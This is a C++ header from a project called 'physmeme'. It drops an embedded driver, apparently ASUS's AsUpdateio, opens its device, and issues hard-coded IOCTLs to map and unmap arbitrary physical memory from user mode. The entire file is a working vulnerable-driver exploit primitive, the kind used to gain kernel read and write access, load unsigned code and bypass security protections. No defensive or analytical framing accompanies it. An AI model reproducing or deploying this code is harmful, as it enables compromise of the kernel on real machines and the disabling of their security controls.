#pragma once
#include <windows.h>
#include <cstdint>

#include "../util/util.hpp"
#include "../loadup.hpp"
#include "../raw_driver.hpp"

#define MAP_PHYSICAL 0xA040244C
#define UNMAP_PHYSICAL 0xA0402450

#pragma pack ( push, 1 )
typedef struct _GIOMAP
{
	unsigned long	interface_type;
	unsigned long	bus;
	std::uintptr_t  physical_address;
	unsigned long	io_space;
	unsigned long	size;
} GIOMAP;
#pragma pack ( pop )

namespace physmeme
{
	inline std::string drv_key;
	inline HANDLE drv_handle = NULL;

	inline bool load_drv()
	{
		const auto [result, key] =
			driver::load(
				raw_driver,
				sizeof(raw_driver)
			);

		drv_key = key;
		drv_handle = CreateFile(
			"\\\\.\\AsUpdateio",
			GENERIC_READ | GENERIC_WRITE,
			NULL,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		return drv_handle;
	}

	inline bool unload_drv()
	{
		return CloseHandle(drv_handle) && driver::unload(drv_key);
	}

	inline std::uintptr_t map_phys(std::uintptr_t addr, std::size_t size, std::uint16_t nt_page_off)
	{
		//--- ensure the validity of the address we are going to try and map
		if (!util::is_valid(addr))
			return NULL;
		size -= addr & 0xFFFF;
		GIOMAP in_buffer = { 0, 0, addr, 0, size };
		uintptr_t out_buffer[2] = { 0 };
		unsigned long returned = 0;

		if (!DeviceIoControl(
			drv_handle,
			MAP_PHYSICAL,
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			reinterpret_cast<LPVOID>(out_buffer),
			sizeof(out_buffer),
			&returned, NULL
		))
			return NULL;
		return (out_buffer[0] - nt_page_off * 4 + nt_page_off);
	}

	inline bool unmap_phys(std::uintptr_t addr, std::size_t size)
	{
		uintptr_t in_buffer = addr;
		uintptr_t out_buffer[2] = { sizeof(out_buffer) };
		unsigned long returned = NULL;

		return DeviceIoControl(
			drv_handle, 
			UNMAP_PHYSICAL, 
			reinterpret_cast<LPVOID>(&in_buffer),
			sizeof(in_buffer),
			reinterpret_cast<LPVOID>(out_buffer),
			sizeof(out_buffer),
			&returned, NULL
		);
	}
}